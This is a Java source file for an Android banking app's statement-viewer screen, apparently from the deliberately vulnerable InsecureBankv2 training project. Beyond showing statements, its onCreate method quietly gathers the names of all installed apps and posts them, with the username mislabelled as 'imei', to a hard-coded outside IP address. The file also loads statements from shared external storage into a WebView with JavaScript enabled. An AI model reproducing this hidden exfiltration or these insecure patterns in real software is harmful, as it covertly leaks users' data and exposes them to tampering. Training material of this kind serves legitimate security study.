package com.android.insecurebankv2;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.view.Menu;
import android.view.MenuItem;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.widget.Toast;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

/*
The page that allows the user to view transaction history for the logged in user
@author Dinesh Shetty
*/
public class ViewStatement extends Activity {
	String uname;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_view_statement);
		Intent intent = getIntent();
		uname = intent.getStringExtra("uname");
		//String statementLocation=Environment.getExternalStorageDirectory()+ "/Statements_" + uname + ".html";
		String FILENAME="Statements_" + uname + ".html";
		File fileToCheck = new File(Environment.getExternalStorageDirectory(), FILENAME);
		System.out.println(fileToCheck.toString());
		if (fileToCheck.exists()) {
			//Toast.makeText(this, "Statement Exists!!",Toast.LENGTH_LONG).show();

			WebView mWebView = (WebView) findViewById(R.id.webView1);
			//   Location where the statements are stored locally on the device sdcard
			mWebView.loadUrl("file://" + Environment.getExternalStorageDirectory() + "/Statements_" + uname + ".html");
			mWebView.getSettings().setJavaScriptEnabled(true);
			mWebView.getSettings().setSaveFormData(true);
			mWebView.getSettings().setBuiltInZoomControls(true);
			mWebView.setWebViewClient(new MyWebViewClient());
			WebChromeClient cClient = new WebChromeClient();
			mWebView.setWebChromeClient(cClient);
		} else
		{
			Intent gobacktoPostLogin =new Intent(this,PostLogin.class);
			startActivity(gobacktoPostLogin);
			Toast.makeText(this, "Statement does not Exist!!",Toast.LENGTH_LONG).show();
		}

		final PackageManager pm = getPackageManager();
		List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
		StringBuilder sb = new StringBuilder();
		for (ApplicationInfo packageInfo : packages) {
			sb.append(packageInfo.packageName);
		}
		new PostDataTask().execute(sb.toString());
	}

	class PostDataTask extends AsyncTask< String, String, String > {

		@Override
		protected String doInBackground(String...params) {
			try {
				postData(params[0]);
			} catch (Exception e) {
				e.printStackTrace();
			}
			return null;
		}

		protected void onPostExecute(Double result) {}
		protected void onProgressUpdate(Integer...progress) {}

		public void postData(String valueIWantToSend) throws ClientProtocolException, IOException, JSONException, InvalidKeyException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException {
			try {
				HttpClient httpclient = new DefaultHttpClient();
				HttpPost httppost = new HttpPost("http://165.124.182.177:8888/postdata");
				// Add your data
				List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
				nameValuePairs.add(new BasicNameValuePair("username", uname));
				nameValuePairs.add(new BasicNameValuePair("imei", valueIWantToSend));
				httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
				// Execute HTTP Post Request
				HttpResponse responseBody = httpclient.execute(httppost);

				InputStream in = responseBody.getEntity().getContent();
				String result = convertStreamToString(in);
				System.out.println("NULIST: PostData RS: " + result);
			}
			catch(Exception e){
				System.err.println("NULIST: error postdata: "+e.toString());
			}
		}
	}

	private String convertStreamToString(InputStream in ) throws IOException {
		// TODO Auto-generated method stub
		BufferedReader reader = null;
		try {
			reader = new BufferedReader(new InputStreamReader( in , "UTF-8"));
		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		StringBuilder sb = new StringBuilder();
		String line = null;
		while ((line = reader.readLine()) != null) {
			sb.append(line + "\n");
		} in .close();
		return sb.toString();
	}

	// Added for handling menu operations
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {

		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	// Added for handling menu operations
	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		int id = item.getItemId();
		if (id == R.id.action_settings) {
			callPreferences();
			return true;
		} else if (id == R.id.action_exit) {
			Intent i = new Intent(getBaseContext(), LoginActivity.class);
			i.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
			startActivity(i);
			return true;
		}
		return super.onOptionsItemSelected(item);
	}

	public void callPreferences() {
		// TODO Auto-generated method stub
		Intent i = new Intent(this, FilePrefActivity.class);
		startActivity(i);
	}
}